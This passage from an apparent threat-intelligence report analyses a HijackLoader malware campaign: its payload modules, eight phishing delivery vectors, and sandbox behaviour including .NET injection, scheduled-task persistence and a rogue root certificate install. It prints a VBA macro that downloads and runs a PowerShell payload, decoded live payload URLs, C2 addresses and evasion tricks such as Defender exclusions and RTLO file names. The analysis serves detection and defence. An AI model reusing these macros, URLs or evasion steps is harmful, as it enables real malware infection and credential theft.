  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-perhost-envvar-generator.png" | relative_url }}" alt="Ghidra decompiler view of pe_03 function FUN_1400001bc0 — the per-host environment variable name generator. Locals: uVar2, local_68, local_64, local_60, local_5c, local_58, plus a 32-byte buffer local_50 and a 48-byte stack buffer acStack_30. The function calls FUN_140001690 to zero local_50 (32 bytes), invokes the API at param_1[0] with arguments local_50 and local_64 (sets local_64 = 0x10 = 16 for the wide-char buffer length parameter passed to GetComputerNameW), invokes the RtlHash wrapper at param_1[4] over local_50, XORs the resulting hash with param_4 (the magic 0xa1b2d3b4 in caller), then dispatches to a srand call via param_1[2], iterates rand() to fill acStack_30 with 'A' + (rand()%26) wide characters, and writes them to *param_3.">
  <figcaption><em>Figure 10: pe_03 per-host env-var name generator (function <code>FUN_1400001bc0</code>). The function reads the local hostname via <code>GetComputerNameW</code>, hashes it with the resolved <code>RtlHashUnicodeString</code> wrapper, XORs the hash with the magic constant <code>0xa1b2d3b4</code> to produce a deterministic per-host seed, seeds <code>srand</code> with it, and emits a hostname-deterministic uppercase-A-Z env-var name. The same seed is also exported via <code>*param_3</code> as the decryption key for the loaded payload — one secret serving as both env-var name source and decryption key.</em></figcaption>
</figure>

### 4.8 pe_06 — Rugmi.HP GoProxy MITM CA Cert Installer

**File facts:**

| Field | Value |
|---|---|
| SHA256 (prefix) | `68bee500…` (full hash in IOC feed) |
| Size | 2.5 KB i386 DLL |
| Compile timestamp | 2023 |
| Export | `_tiny_erase_` (called via `rundll32 <path>,#1`) |
| VT detection | 50/71 |
| VT family labels | Microsoft `Trojan:Win32/Rugmi.HP!MTB`, Kaspersky `Trojan.Win32.Agent.xbhqts`, Symantec `Trojan Horse` |

`pe_06` installs the GoProxy `goproxy.github.io` root certificate into the Windows certificate store at `HKCU\Software\Microsoft\SystemCertificates\Root\Certificates` (and machine variant). This enables HTTPS MITM for credential, cookie, and banking-session theft.

**Cert details (per VT C2AE sandbox capture):**

| Field | Value |
|---|---|
| Subject | `C=IL, ST=Center, L=Lod, O=GoProxy, OU=GoProxy, CN=goproxy.github.io` |
| Thumbprint (SHA1) | **`0174E68C97DDF1E0EEEA415EA336A163D2B61AFD`** |
| Install location | `HKEY_USERS\<SID>\Software\Microsoft\SystemCertificates\Root\Certificates\0174E68C97DDF1E0EEEA415EA336A163D2B61AFD\Blob` |

The DLL has an empty import table (`ImportTableIsBad` YARA) — APIs resolved at runtime via PEB walking + CRC32 hashing. This is the same pattern as pe_03. The empty import table prevents naive defenders from seeing `crypt32` imports, but the cert install is captured behaviorally by VT C2AE sandbox.

> **Caveat:** the cert install was not directly observed in the analyst's 5-minute behavioral sandbox window. Procmon CSV and behavioral sandbox Registry Activity section both lack the cert-blob write. PE_06 is in the malware (VT confirms) but is conditionally loaded — either the loader didn't reach pe_06 in 5 minutes, or its invocation depends on a host-fingerprint check that didn't match the FlareVM lab environment.

### 4.9 pe_07 — Operator-Bespoke Bundle-Cleanup Helper (Campaign-Unique)

**File facts:**

| Field | Value |
|---|---|
| SHA256 (prefix) | `2d8728f0…` (full hash in IOC feed) |
| Size | 3.4 KB x86_64 DLL |
| Export | `_tiny_erase_` (same export name as pe_06 — possibly chained) |
| VT detection | NOT ON VT (campaign-unique — first observation) |

Operator-specific filename manifest baked into the DLL's ASCII strings:
- `ExceptionHandler.dll`
- `shadermgr93.rc`
- `networkspec17.log`
- `SlideShowEditor.ini`
- Mock Wondershare-product names: `NLEService.dll`, `WS_ImageProc.dll` (etc.)

State-machine prefixes in the manifest strings:
- `!CrystSupervisor32.exe` — `!` prefix encodes one state
- `~NLEService.dll` — `~` prefix encodes another state

This is the operator's bundle-cleanup helper — it iterates through the manifest and erases (or modifies) the operator's drop artifacts after execution. **Never seen on VT** — campaign-unique to this operation.

### 4.10 pe_08 — Genuine Qihoo 360 PromoUtil.exe (Becomes WVault.exe at Runtime)

**File facts:**

| Field | Value |
|---|---|
| SHA256 (in bundle, prefix) | `ca9f859f…` (full hash in IOC feed) |
| SHA256 (dropped as `WVault.exe`, prefix) | `c085a724…` (full hash in IOC feed) |
| Size | 1.8 MB i386 |
| PDB | `C:\vmagent_new\bin\joblist\881673\out\Release\PromoUtil.pdb` |
| Compile timestamp | 2025-03-31 |
| Build time string | `Mon Mar 31 00:17:37 2025` |
| Description | "Promotion Utility Application" v8.6.0.1311 |
| Authenticode | GlobalSign EV code signing CA + DigiCert TrustedRoot G4 |
| VT detection (in bundle) | NOT ON VT |
| Toolchain | PureBasic + Microsoft Linker 9.00.30729 (VS 2008) |

This is **genuine signed Qihoo 360 PromoUtil.exe**, not an operator build. Qihoo product strings (`Check360AppTool`, `BSRULE`, `BS_Promotion`, `BypassMetroDesktop`, `BootSpeed_`) and 30+ legitimate Qihoo URLs (`enterprise.360totalsecurity.com`, `premium.360totalsecurity.com`, `store.360totalsecurity.com`, `orion.ts.360.com/promo/`, `s.360safe.com`, `reslog.360seas.com`, `spec.cloud.360safe.com`, `www.360totalsecurity.com`) confirm legitimacy.

The runtime drop hash differs from the bundle hash (`c085a724…` vs `ca9f859f…`). Three explanations are plausible (each at INSUFFICIENT confidence): (a) a slightly different version was selected at runtime, (b) operator post-extraction modification, or (c) one of the hashes was misread. The divergence itself is HIGH confidence; the cause is INSUFFICIENT. The runtime use is the novel part — see Section 6 for how this becomes the .NET injection host.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-wvault-qihoo-properties.png" | relative_url }}" alt="Process Explorer Properties dialog for WVault.exe (PID 2596). The Image tab shows: Image File 'Promotion Utility Application' with the Qihoo 360 yellow-and-green icon, Version 8.6.0.1311, Build Time 'Mon Mar 31 00:17:37 2025', Path 'C:\\ProgramData\\WVault.exe', Command line 'C:\\ProgramData\\WVault.exe', Current directory 'C:\\Users\\FlareVM\\AppData\\Roaming\\adv_ctrl\\', Autostart Location n/a, Parent listed as 'Non-existent Process (9840)', User FlareVM\\FlareVM, Started 7:26:40 AM 5/6/2026, Image x86, DEP enabled, ASLR Bottom-Up, Control Flow Guard Disabled, Stack Protection Disabled.">
  <figcaption><em>Figure 11: Process Explorer view of <code>WVault.exe</code> at runtime. The properties confirm the file is the genuine Qihoo 360 "Promotion Utility Application" (v8.6.0.1311, Mar 2025 build) — not operator-built. The current directory <code>C:\Users\FlareVM\AppData\Roaming\adv_ctrl\</code> reveals the operator's persistence directory codename <code>adv_ctrl</code>, and the parent process listing as <code>&lt;Non-existent Process&gt;</code> indicates the launching parent already exited (consistent with the <code>WinExec</code> fire-and-forget pattern from <code>InitializeSetup()</code>).</em></figcaption>
</figure>

---

## 5. Static Analysis — The Eight Delivery Vectors

This section walks each of the eight initial-access vectors at the static-artifact level. Every vector below was extracted from the open directory and analyzed independently. All converge on the same loader chain.

### 5.1 `.url` Internet Shortcuts (NTLM hash leak + WebDAV fetch)

**Files in kit:** `VSEZBSRABOTAT.url`, `NDA_Verification222.url`, `Price.pdf.url`, `2.url`.

Each `.url` file uses the form `URL=file:///\\<typosquat-host>\<path>\<payload>` to trigger WebDAV/SMB resolution. When the user double-clicks the shortcut, Windows attempts to authenticate to the typosquat host (potentially leaking the NTLM hash) and then fetch the payload over WebDAV/HTTP.

The filename `VSEZBSRABOTAT.url` is the strongest single Russian-language artifact in the corpus — a transliteration of the Russian phrase "vse zarabotat'" ("earn everything"). This is operator-curated content, not auto-generated, and is consistent with operator-language attribution at HIGH confidence (Section 11).

### 5.2 `.lnk` Shortcuts (UNC argument with space padding)

**Files in kit:** `sss.lnk`, `xxx.lnk`, `13223.lnk`.

Each `.lnk` targets `C:\Windows\explorer.exe` with a UNC argument padded with approximately 232 spaces. The padding pushes the actual UNC path off the visible portion of any UI that displays the LNK target — including some EDR consoles and forensic tools.

`13223.lnk` chains through `2.url` (the LNK fetches a URL, and the URL fetches `PUTTY.exe` from the second-stage IP). This is a defensive-evasion layered approach: even if a defender unpacks the LNK and inspects the immediate target, the second hop is not visible without further dereferencing.

### 5.3 Macro Office Documents (reverse-encoded URL)

**Files in kit:** `Price5.docm`, `Price6.doc`, `NDA.doc`, `Price4.xls`.

Each macro document uses an `AutoOpen()` (Word) or `Workbook_Open()` (Excel) handler. The macro spawns PowerShell with a reverse-encoded URL pattern:

```vba
Sub AutoOpen()
Application.ScreenUpdating = False
Dim PM As Integer
PM = Shell("powershell -C ""$RT='exe.<reverse-encoded URL>'.ToCharArray();[array]::Reverse($RT);$UT=($RT -join '');$PT = $env:temp + '\application.exe';iwr $UT -o $PT;start-process $PT;""", 0)
End Sub
```

**Per-lure-theme payload routing (decoded):**

| Lure file | Decoded URL |
|---|---|
| `Price5.docm` / `Price6.doc` / `Price4.xls` | `https://s3.g.s4.mega.io/aileqac3yep7oqdhygjpberqqnk2zrnhck2lx/busket/putty2.exe` |
| `NDA.doc` | `https://s3.g.s4.mega.io/aileqac3yep7oqdhygjpberqqnk2zrnhck2lx/busket/Bravo/vida/NGZTDICF.exe` |

The Mega.io subdir `/busket/` is a stable operator-fingerprint typo of `/bucket/` — observed across all delivery vectors and across 15+ months of campaign duration. The `/Bravo/vida/` substructure is the operator's NDA-themed campaign codename.

A separate file `Excel_2016_Windows.bat` pre-conditions the host by setting `HKCU\Software\Microsoft\Office\1[6,9].0\{Word,Excel}\Security\VBAWarnings = 1`, disabling macro-security warnings before the macro Office docs are opened.

### 5.4 RTLO Disguise (`.scr` and `.msi` reading as `.PDF`)

**Files in kit:** `puttyfdp.scr`, `NDA_Agreementsfdp.msi`, `Carriers_Agreements_009RCARHEFfd..scr`.

The U+202E codepoint (Unicode Right-to-Left Override) flips the display direction so that filenames containing `fdp.scr` render visually as `rcs.pdf` — the real `.scr` extension reads as `.PDF` in Explorer.

**The new variant `Carriers_Agreements_009RCARHEFfd..scr` (rescan 2026-05-03)** adds a Cyrillic-р homoglyph (`%d1%80`) to the URL-encoded form, layered with the U+202E codepoint (`%e2%80%ae`). This defeats Unicode-only RTLO-stripping rules that filter `%e2%80%ae` but don't normalize Cyrillic-Latin homoglyph confusables. The variant was **NOT on VirusTotal as of 2026-05-03 — fresh build by operator**.

### 5.5 Fake-PDF `.exe` (long-timestamp filename)

**Files in kit:** `NDA_Agreements.PDF_2025-12-22 06-50-31-659.exe`, `NDA_Agreements.PDF_2025-12-22-06-50-39-658.exe`, `PriceList.PDF_2025-12-22 06-50-39-659.exe`.

The long timestamp filename (62+ characters) pushes the actual `.exe` extension off the visible portion of Explorer's filename column. Combined with a default Explorer view that hides extensions (`HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt = 1`), the file appears as a PDF with the timestamp visible but `.exe` hidden.

### 5.6 MSC GrimResource (T1218.014 MMC)

> **Analyst note:** GrimResource is a technique that turns a Microsoft Management Console (`.msc`) file into a malware launcher. The `.msc` file references a special internal Windows resource (`apds.dll`'s `redirect.html`) that supports a `target=javascript:eval(...)` URL parameter. Through that parameter, the operator runs JavaScript inside an XSL-transform context that finally executes PowerShell or VBScript — all from a file extension that most users and many email-gateway content filters treat as safe. Two operator tiers appear in this corpus: a simple Tier-1 variant that just downloads and runs a payload, and a Tier-2 variant that first disables Windows Defender's protection on a wildcard extension before doing the same.

**Files in kit:**
- `1.msc` (Tier-1)
- `Price2.pdf.msc` (Tier-2 — upgraded)
- `MSCFile.msc` (Tier-2 — upgraded)

**Tier 1 chain (`1.msc`):**

```
hidden window + res://apds.dll/redirect.html?target=javascript:eval(...)
                |
                v
eval(rootNode.Name) - executes the rootNode-encoded JavaScript
                |
                v
URL-encoded XSL transform - decodes embedded VBScript
                |
                v
PowerShell single-source download from
  https://s3.g.s4.mega.io/.../busket/putty.exe
                |
                v
Execute payload + taskkill /IM mmc.exe /F   (self-cleanup)
```

**Tier 2 chain (`Price2.pdf.msc`, `MSCFile.msc` — upgraded):**

Same GrimResource entry but with two upgrades:
1. **Defender exclusion of 6 paths** AND `Add-MpPreference -ExclusionExtension *` (wildcard extension exclusion — disables Defender's coverage on all file extensions in the excluded paths)
2. **Dual-source download** — `curl` primary + PowerShell `iwr` fallback — from BOTH `109.120.137.6/PUTTY.exe` AND Mega.io `/busket/putty.exe`. Both downloads execute. Then `taskkill /IM mmc.exe /F` self-cleans.

The Tier-2 dual-source download pattern provides redundancy if one of the two payload servers is taken down — the operator does not need to re-build and re-distribute lure files when a server is killed.

### 5.7 HTA / MHT / MHTML Proof-of-Concept Artifacts

**Files in kit:** `hta.hta`, `mht.mht`, `mhtml.mhtml` (rescan 2026-05-03).

Invoked via `mshta.exe` (signed Microsoft LOLBAS — Living-Off-the-Land Binary). The `windowstate="minimize"` HTA attribute keeps the window invisible to the user. Critically, `mshta.exe \\webdav-host\file.hta` works from network paths — the operator can stage the HTA on a WebDAV server and have it fetched and executed remotely via a single LNK or URL pointer.

These specific files in the corpus are **operator dev/POC artifacts** — each contains Russian-language comments and uses `cmd.exe /k ipconfig` as the test payload. The operator likely deploys parallel files with real payloads in production but accidentally left the test versions in the staging directory. The presence of these files is a strong operator-fingerprint signal — they don't match any commercial phishing kit's stock content.

### 5.8 `.xll` Excel-DNA Add-Ins

**Files in kit:** `Price3.xll` (3.4 MB DLL with `init.dll,#1` rundll32 entry), `Macros64_2_.xll` (49 KB).

Excel `.xll` add-ins bypass Office macro-block policies — the user is prompted to allow the add-in, but the prompt is generic ("trust this add-in?") rather than the macro-specific warning that mature users have learned to reject. Once allowed, the XLL DLL runs with full Excel context.

The XLL delivery in a HijackLoader chain is itself under-documented in public reporting. XLL is more commonly paired with simpler non-modular loaders (Dridex, Agent Tesla, Buer) than with HijackLoader's modular loader-chain architecture — this is a multi-vector operator integrating delivery primitives that would otherwise be siloed in separate kits.

### 5.9 SFX Installer Variants

**Files in kit:** `Carriers.exe` (Inno Setup 6.5+, primary dynamic sample), `LDKPOIZD.exe` (WiX Burn), `MWXTCKDB.exe` (Embarcadero Delphi), `VFSZQPTV.exe` (Embarcadero Delphi), `PPMANLYP.exe` (MSVC + 7-Zip SFX), `anvirrus.exe`, `NDA_Agreements.PDF_*.exe`, `PriceList.PDF_*.exe`, `putty2222.exe`.

The operator does not commit to a single SFX format. WiX Burn, Inno Setup, 7-Zip SFX, and Embarcadero Delphi all appear. This is a deliberate evasion — a defender writing a YARA rule against a specific SFX format catches one vector but misses the others. Each variant performs the same loader chain unpack but uses a different outer-format wrapper.

`LDKPOIZD.exe` carries the VT canonical filename `cytotoxin.exe` — an operator codename consistent with the eclectic-vocabulary operator-codename pattern documented in Section 11.

### 5.10 Bundled RMM and LOLBins (accessory toolkit)

**Files in kit:** `AnyDesk.exe`, `processhacker-2.39-setup.exe`, `putty.exe` / `PUTTY.exe`, `KMSAuto Net.exe`.

This is a standard Russian-affiliate accessory toolkit. AnyDesk is a legitimate remote-management tool (RMM) that the operator can use for hands-on-keyboard access after initial compromise. Process Hacker is a legitimate process-inspection tool useful for the operator's own process surveillance. PuTTY is bundled as the lure-themed "PuTTY download" payload that several of the GrimResource and macro vectors fetch. KMSAuto Net is a Windows activation cracker — present here as both bait (users searching for free Windows activation) and as an operator dual-use tool.

These tools are genuine and signed (where applicable). They are not malicious in themselves — but their co-location in an attacker-staging directory alongside operator-controlled malware is a strong attribution signal for the operator's intended use.

---

## 6. Dynamic / Behavioral Analysis

The dynamic analysis was performed on `Carriers.exe` under FlareVM @ 192.168.100.100 with REMnux gateway @ 192.168.100.1 (INetSim + Suricata + Zeek + tcpdump). 305-second behavioral sandbox (Noriben) monitoring window inside a 37-minute total wrapper run. Sysmon EVTX captured the full 33-minute beacon span.

### 6.1 Process Tree

```
python.exe:3576 (analysis harness)
  Carriers.exe:1908 (Inno Setup installer - original sample)
    Carriers.tmp:4416 (Inno runtime, /SL5= flag)
      %LocalAppData%\Temp\is-EPKFU.tmp\CrystSupervisor32.exe:3640 (extracted to temp)
        %AllUsersProfile%\adv_ctrl\CrystSupervisor32.exe:9840 (persistent copy)
          %AllUsersProfile%\WVault.exe:2596  <-- THE C2 PROCESS
          %AppData%\adv_ctrl\Crisp.exe:10072
            (creates scheduled task watchermgmt.job)
```

**Process timing chain (DEFINITE — Procmon Process Start events):**

```
07:26:26.43  Carriers.exe (PID 1908)         - original sample launches
07:26:27.16  Carriers.tmp (PID 4416)         - Inno Setup runtime extracts (0.7s gap)
07:26:28.85  CrystSupervisor32.exe (PID 3640) - temp extraction (1.7s gap)
07:26:30.20  CrystSupervisor32.exe (PID 9840) - persistent copy (1.4s gap)
07:26:40.90  WVault.exe (PID 2596)            - C2-bearing process (10.7s gap)
07:27:09.31  TCP Connect to 185.241.208.129:56167  - first beacon (28.4s after launch)
07:27:11.50  Crisp.exe (PID 10072)            - persistence-establishing process
07:27:24.62  C:\Windows\Tasks\watchermgmt.job created (262 bytes)
07:27:24.74  Crisp.exe exits                   - Crisp lifespan: 13 seconds
```

**Total time from sample launch to first C2 beacon: ~43 seconds.**

`CrystSupervisor32.exe` is launched THREE times — temp extraction, persistent dir, then final injected version. The persistent copy (PID 9840) is the spawner that drops both `WVault.exe` and `Crisp.exe`. `WVault.exe` is the network-bearing endpoint. `Crisp.exe` is the persistence-establishing binary (creates the scheduled task) and exits 13 seconds later — short-lived, single-purpose helper.

### 6.2 Stage-by-Stage File Drop Sequence

> **Analyst note:** This section walks through what files appear on disk and when, in chronological order. Every file the static analysis predicted appeared at runtime in the predicted location. The predict-vs-observe match across 13+ files is itself a positive finding — it means the static-analysis chain reconstruction is reliable, which matters for confidence in the cipher/algorithm sections that the static analysis was unable to byte-confirm.

**Phase 1 — Carriers.tmp (PID 4416) extracts to `is-EPKFU.tmp\` from 14:26:28.08 to 14:26:28.79 (~0.7s):**

13 files dropped: `BugSplat.dll`, `COMSupport.dll`, `CrystSupervisor32.exe`, `DBGHelp.dll`, `DVDSetting.dll`, `ExceptionHandler.dll`, `NLEResource.dll`, `NLEService.dll`, `NLETransitionMgr.dll`, `WsBurn.dll`, `WSUtilities.dll`, `WS_ImageProc.dll`, `WS_Log.dll`.

**Phase 2 — CrystSupervisor32.exe PID 3640 (temp) drops to `C:\ProgramData\adv_ctrl\` from 14:26:30.12 to 14:26:30.16 (~40ms — very fast, parallel writes):**

Same 13 files copied to persistent location, plus `shadermgr93.rc`, `networkspec17.log`, `SlideShowEditor.ini`.

**Phase 3 — CrystSupervisor32.exe PID 9840 (persistent) drops the inner stages:**

```
14:26:31.08  C:\Users\FlareVM\AppData\Roaming\adv_ctrl\Crisp.exe
14:26:40.87  C:\ProgramData\WVault.exe
%LocalAppData%\Temp\807D7B6.tmp (3,344,451 bytes - encrypted payload)
%LocalAppData%\Temp\865FDFD.tmp (40-byte metadata blob)
%LocalAppData%\Temp\827E498.tmp (short-lived scratch - already cleaned up)
```

**Phase 4 — Crisp.exe PID 10072 establishes persistence:**

```
14:27:24.62  C:\Windows\Tasks\watchermgmt.job (Crisp.exe - 262 bytes)
14:27:24.71  C:\Windows\System32\Tasks\watchermgmt (svchost.exe PID 1932 - Task Scheduler service)
```

This dynamically validates 100% of the static-analysis predictions for the file drop chain.

### 6.3 .NET Injection into Renamed Qihoo PromoUtil.exe (WVault.exe)

> **Analyst note:** `WVault.exe` is the heart of the runtime infection. The file dropped to `C:\ProgramData\WVault.exe` is a renamed copy of the genuine signed Qihoo 360 PromoUtil.exe — the binary itself is legitimate and Authenticode-signed. At runtime, the parent process (`CrystSupervisor32.exe`) creates this file and uses it as a hollow target for .NET assembly injection. After injection, the parent exits, leaving `WVault.exe` orphaned. Inspecting the orphaned process in Process Explorer reveals .NET CLR thread start addresses inside what should be a non-managed Qihoo binary — that's the smoking gun that .NET RAT code is running inside it. This pattern is reused across at least eight separate campaigns since 2025; defenders should detect the pattern, not specific hashes.

**Static identification of the dropped binary (at rest):**
- PDB path: `C:\vmagent_new\bin\joblist\881673\out\Release\PromoUtil.pdb` — matches PE_08 identification
- Authenticode chains to GlobalSign EV code signing CA + DigiCert TrustedRoot G4
- Qihoo product strings preserved
- Build time string: `Mon Mar 31 00:17:37 2025`

**Runtime properties (Process Explorer):**
- Description / Version Info: "Promotion Utility Application" v8.6.0.1311
- Architecture: x86 (32-bit)
- Path: `C:\ProgramData\WVault.exe`
- Parent process: `<Non-existent Process>(9840)` — `CrystSupervisor32.exe` had already exited; **WVault.exe is an orphan, classic post-injection pattern**
- Started: 07:26:40 AM
- DEP: Enabled (permanent) · Control Flow Guard: Disabled · Stack Protection: Disabled

**.NET CLR threads in WVault.exe** (4 threads visible in Process Explorer — Threads tab):

| TID | Start address | Significance |
|---|---|---|
| 5332 | `WVault.exe+0xfc896` | Native main thread (within Qihoo binary code) |
| 6640 | **`clr.dll!GetIdentityAuthority+0x4d0`** | **.NET runtime thread** |
| 8236 | **`clr.dll!CreateAssemblyNameObject+0xa940`** | **.NET assembly loader thread** |
| 6328 | `ntdll.dll!TpCallbackIndependent+0x140` | Thread pool worker |

The presence of `clr.dll!CreateAssemblyNameObject` is a classic indicator of in-memory .NET assembly loading. Combined with the Polish C2 destination and the pre-existing VT IDS rule hits (AsyncRAT JA3 + AsyncRAT/zgRAT SSL cert pattern + DCRat SSL cert), this strongly indicates **injected .NET malware running inside the genuine Qihoo binary**.

**Static analysis predicted (from VT IDS rules on Carriers.exe SSL handshake): AsyncRAT, zgRAT, DCRat. All three are .NET-based RATs.** The .NET CLR thread evidence in the dropped/hollowed binary VALIDATES this prediction.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-wvault-clr-threads.png" | relative_url }}" alt="Process Explorer Threads tab for WVault.exe (PID 2596). Count 4 threads. TID 5332 with start address 'WVault.exe+0xfc896' (highlighted as the main thread). TID 6640 with start address 'clr.dll!GetIdentityAuthority+0x4d0'. TID 8236 with start address 'clr.dll!CreateAssemblyNameObject+0xa940'. TID 6328 with start address 'ntdll.dll!TpCallbackIndependent+0x140'.">
  <figcaption><em>Figure 12: Process Explorer Threads tab confirms .NET CLR runtime activity inside <code>WVault.exe</code>. The Qihoo PromoUtil.exe binary itself is native (unmanaged) — yet two threads start inside <code>clr.dll</code> (the .NET CLR), specifically at <code>GetIdentityAuthority</code> and <code>CreateAssemblyNameObject</code>. <code>CreateAssemblyNameObject</code> is the canonical entry point used to load a .NET assembly by name from memory, which is the smoking-gun signature of in-memory .NET RAT injection into a legitimate signed Qihoo binary.</em></figcaption>
</figure>

**Cross-campaign TTP cluster:** Per VT execution_parents pivot, the renamed Qihoo PromoUtil.exe injection-host pattern is used by **at least 8 distinct malware campaigns since 2025** — this campaign (`Carriers.exe`), Total Security.zip, ClickFix `.txt` lures (`Confirm-Google-Verify-Im-not-a-Robot.txt`), KMSPico cracks, auto_black_abuse MSIs, 360 fake installer 7z, multiple `Installer.exe` variants, and other Qihoo-PromoUtil-rename builds. Detection rules should target the PATTERN (legitimate-Qihoo-binary-orphaned-with-CLR-threads) rather than specific hashes.

### 6.4 Persistence: Legacy `.job` + Defender Exclusion + Cert Install

> **Analyst note:** The persistence design here is operator-clever in a way that the static analysis did not predict. Static analysis said the malware would use a Startup folder shortcut with a per-host random folder name in `%APPDATA%`. The actual mechanism is a legacy Windows scheduled-task file (`.job` format, predates Vista) at `C:\Windows\Tasks\watchermgmt.job`. This format is an autorunsc enumeration blind spot — the standard Sysinternals tool that defenders use to inventory persistence does not enumerate `.job` files. The operator pairs this with a Defender exclusion of the drop directory and (per VirusTotal sandbox capture) a GoProxy MITM root certificate install. Combined, the three together give the operator protected execution, persistence enumeration evasion, and HTTPS interception capability.

#### 6.4.1 Legacy `.job` scheduled task

Created by `Crisp.exe` (PID 10072) at `07:27:24.62`:
- Path: `C:\Windows\Tasks\watchermgmt.job`
- Format: legacy Windows scheduled task (binary `.job` format, predates Vista XML format)
- Size: 262 bytes
- **Autorunsc does NOT enumerate `.job` files in `C:\Windows\Tasks\` by default** — explains the "0 new entries" autoruns comparison

**Auto-migration to XML format** (within 90 ms of legacy `.job` write):
- `svchost.exe` (Task Scheduler service, `-k netsvcs -s Schedule`) automatically creates the XML entry at `C:\Windows\System32\Tasks\watchermgmt`
- Both files exist after the run

**XML task content (verified):**

```xml
<Task version="1.1">
  <RegistrationInfo>
    <Author>Flare\FlareVM</Author>
    <URI>\watchermgmt</URI>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT1H</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2026-05-06T07:33:00</StartBoundary>
      <ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Settings>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
  </Settings>
  <Principals>
    <Principal id="Author">
      <UserId>Flare\FlareVM</UserId>
      <RunLevel>HighestAvailable</RunLevel>
      <LogonType>InteractiveToken</LogonType>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>C:\ProgramData\adv_ctrl\CrystSupervisor32.exe</Command>
    </Exec>
  </Actions>
</Task>
```

The task is COMPLETE, VALID, and ACTIVE. Persistence runs `CrystSupervisor32.exe` once per hour with daily recurrence in the user's context with highest-available privileges. The 1-hour heartbeat is consistent with HijackLoader's documented persistence cadence.

#### 6.4.2 Defender exclusion

```
[RegSetValue] MsMpEng.exe:3924
  HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\ProgramData\adv_ctrl = 0
```

The setvalue is from `MsMpEng.exe` (Defender itself) — HIGH confidence that it was added by Defender, not written directly by the malware process. The invocation mechanism (`Set-MpPreference -ExclusionPath` vs WMI AddPath vs direct API call) is INSUFFICIENT confidence. Regardless of mechanism, this prevents future Defender scans from touching the persistence directory.

#### 6.4.3 GoProxy MITM CA cert (HIGH confidence — VT C2AE confirmed)

> **Analyst note:** This sub-section documents the MITM certificate-install layer of the persistence model. By installing a GoProxy root certificate into the Trusted Root Certification Authorities store, the operator establishes the cryptographic foundation for transparent HTTPS interception — any subsequent traffic the malware (or a co-resident proxy) routes can be intercepted without browser warnings. The certificate's SHA1 thumbprint is a durable hunt indicator that survives every other rotation the operator might do, because rotating the cert would force re-installation across every infected host. The behavioral observation in this run is partial (the cert install was not directly captured in the 5-minute window), but VT C2AE sandbox executions confirm the technique is in pe_06.

```
HKEY_USERS\<SID>\Software\Microsoft\SystemCertificates\Root\Certificates\
  0174E68C97DDF1E0EEEA415EA336A163D2B61AFD\Blob
```

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/opendirectory-62-60-237-100-20260506/hijackloader-goproxy-ca-cert-install.png" | relative_url }}" alt="VirusTotal C2AE behavioral sandbox capture showing two registry keys set during execution. The first row shows HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Debug\\StoreLocation. The second row, highlighted in green, shows the registry path HKEY_USERS\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\SystemCertificates\\Root\\Certificates\\0174E68C97DDF1E0EEEA415EA336A163D2B61AFD\\Blob with a multi-line hex blob underneath containing the binary X.509 certificate data starting with bytes 5C 00 00 00 01 00 00 00 04 00 00 00 10 00 00 00 04 00 00 00 01 00 00 00 10 00 00 00 0D BE 92 DE FF 7D 36 BB.">
  <figcaption><em>Figure 13: VirusTotal C2AE behavioral sandbox confirming the GoProxy MITM CA certificate install. The malware writes the certificate blob into the user's <code>SystemCertificates\Root\Certificates\&lt;thumbprint&gt;\Blob</code> registry path — placing it into the Trusted Root Certification Authorities store and enabling transparent HTTPS interception with no browser warnings. The thumbprint <code>0174E68C97DDF1E0EEEA415EA336A163D2B61AFD</code> is a durable hunt indicator: defenders can search for this exact registry path in EDR telemetry to detect this operator's TLS-MITM tradecraft on infected hosts.</em></figcaption>
</figure>

The cert install was not directly observed in the analyst's 5-minute behavioral sandbox window (likely beyond the monitoring window or conditional on host fingerprinting that did not match the lab environment). VT C2AE sandbox confirms the technique.

**Why autorunsc misses the `.job` mechanism:** the `.job → XML` migration creates the System32\Tasks file but may not register a corresponding `TaskCache` GUID entry at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}`. Autorunsc primarily enumerates scheduled tasks via the registry-side TaskCache; the XML alone isn't enough for autorunsc to flag it.

### 6.5 Per-Host Random Environment Variables

Round 12 static analysis predicted per-host random env vars set by the loader. Round 13 confirmed all four predicted env vars at runtime. The pattern matches; the exact byte-level algorithm does not.

| Env var name | Env var value | Set by | Notes |
|---|---|---|---|
| `EUOJCZYGOUCUG` | `utvogo` | CrystSupervisor32.exe (PID 3640) | First random env var; set BEFORE PID 9840 spawn |
| `FVTADTEB` | `C:\Users\FlareVM\AppData\Local\Temp\807D7B6.tmp` | CrystSupervisor32.exe (PID 9840) | Path to encrypted payload file |
| `JJZIUTSQYJMNTZ` | `C:\Users\FlareVM\AppData\Local\Temp\865FDFD.tmp` | CrystSupervisor32.exe (PID 9840) | Path to a SECOND encrypted payload |
| `PBZULMYY` | `C:\ProgramData\adv_ctrl\CrystSupervisor32.exe` | CrystSupervisor32.exe (PID 9840) | Path to persistent loader |

Observed lengths (8, 13, 14, 8 chars) match the Round 12 static-analysis predicted range (8–16 chars, uppercase ASCII A–Z, four random env vars per host, deterministic from hostname). **The PATTERN is byte-confirmed.** **The exact algorithm is NOT byte-confirmed** — no FLARE-derived seed produces `EUOJCZYGOUCUG` in 1M-seed brute force. The static reverse missed something material in the algorithm.

